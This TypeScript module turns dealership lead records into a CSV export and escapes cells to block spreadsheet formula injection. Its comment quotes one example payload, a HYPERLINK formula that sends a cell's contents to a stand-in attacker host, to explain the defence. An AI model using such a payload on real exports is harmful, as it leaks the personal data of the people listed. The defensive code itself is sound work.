import { makeLabel } from './format'

const COLUMNS = [
  'Received',
  'Status',
  'Source',
  'Name',
  'Phone',
  'Email',
  'Truck of interest',
  'Financing',
  'Trade-in',
  'Trade-in details',
  'Heard about us',
  'Message',
  'Internal notes',
] as const

const SOURCE_LABELS: Record<string, string> = {
  'truck-inquiry': 'Truck inquiry',
  'financing-prequal': 'Financing pre-qual',
  'general-contact': 'General contact',
}

const STATUS_LABELS: Record<string, string> = {
  new: 'New',
  contacted: 'Contacted',
  'closed-sold': 'Closed — Sold',
  'closed-lost': 'Closed — Lost',
}

/**
 * Quote a CSV field, escaping embedded quotes and forcing text for anything risky.
 *
 * Every value in a lead row is attacker-controlled — anyone on the internet can
 * POST to /api/leads. Quoting alone does NOT stop Excel, Numbers or LibreOffice
 * from evaluating a cell that opens with =, +, -, @, tab or CR, so a name like
 * `=HYPERLINK("https://evil.tld/?d="&A2,"Click here")` becomes a live formula
 * the moment staff open the export. Prefixing an apostrophe forces the
 * spreadsheet to treat the value as literal text; the apostrophe itself is not
 * displayed.
 */
function cell(value: unknown): string {
  if (value == null) return ''
  const s = String(value)
  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s
  return `"${safe.replace(/"/g, '""')}"`
}

interface LeadRow {
  createdAt?: string | null
  status?: string | null
  source?: string | null
  fullName?: string | null
  phone?: string | null
  email?: string | null
  truckOfInterest?: unknown
  financingInterest?: boolean | null
  tradeIn?: boolean | null
  tradeInYearMakeModel?: string | null
  tradeInMileage?: number | null
  tradeInCondition?: string | null
  heardAboutUs?: string | null
  message?: string | null
  internalNotes?: string | null
}

function truckLabel(t: unknown): string {
  if (!t || typeof t !== 'object') return ''
  const r = t as { year?: number; make?: string; model?: string; trim?: string }
  return [r.year, r.make ? makeLabel(r.make) : null, r.model, r.trim].filter(Boolean).join(' ')
}

export function leadsToCsv(leads: LeadRow[]): string {
  const lines = [COLUMNS.map(cell).join(',')]
  for (const l of leads) {
    const tradeInDetails = l.tradeIn
      ? [l.tradeInYearMakeModel, l.tradeInMileage != null ? `${l.tradeInMileage} mi` : null, l.tradeInCondition]
          .filter(Boolean)
          .join(' · ')
      : ''
    lines.push(
      [
        l.createdAt ? new Date(l.createdAt).toISOString() : '',
        STATUS_LABELS[String(l.status)] ?? l.status ?? '',
        SOURCE_LABELS[String(l.source)] ?? l.source ?? '',
        l.fullName ?? '',
        l.phone ?? '',
        l.email ?? '',
        truckLabel(l.truckOfInterest),
        l.financingInterest ? 'Yes' : 'No',
        l.tradeIn ? 'Yes' : 'No',
        tradeInDetails,
        l.heardAboutUs ?? '',
        l.message ?? '',
        l.internalNotes ?? '',
      ]
        .map(cell)
        .join(','),
    )
  }
  // Prepend BOM so Excel reads UTF-8 correctly.
  return '﻿' + lines.join('\r\n')
}
